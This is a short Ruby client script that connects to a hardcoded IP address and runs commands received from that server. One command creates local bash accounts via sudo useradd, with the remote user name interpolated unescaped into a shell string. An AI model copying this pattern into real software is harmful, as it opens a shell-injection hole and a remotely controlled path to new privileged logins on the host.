#!/usr/bin/env ruby -w
require "socket"
require "logger"

$logger = Logger.new('ComServer_logfile.log', 'weekly')
$logger.level = Logger::INFO

class Client
  def initialize(server, instanceID, userName, name)
    @server = server
    @instanceID = instanceID
    @userName = userName
    @name = name
    @directive = nil
    listen
    @directive.join
  end

  def log(*args)
    msg = "#{args.join('')}"
    print(msg)
    $logger.info(msg)
  end

  def listen
    @server.puts("#{@instanceID} #{@userName} #{@name}")
    @directive = Thread.new do
      while line = @server.gets.split
        command(line)
      end
    end
    @directive.join
  end

  def command(input)
    # input = line.split
    case input[0]
    when "useradd"
      create_user(input[1], input[2])
    when "puts"
      log(input[1..-1])
    when "ping"
      # do nothing
    else
    end
  end

  def send_message(message)
    log(message)
  end

  def create_user(us,pw)
    pwd = pw.crypt("$5$a1")
    result = system("sudo useradd -m -p '#{ pwd }' #{ us } -s /bin/bash")
    log($stdin.read)
    if result
            log "#{ us } created!\n"
        else
            log "#{ us } failed!\n"
    end
  end
end

socket = TCPSocket.new('52.3.76.163', 3100)
Client.new(socket, ARGV[0], ARGV[1], ARGV[2])
# 52.3.76.163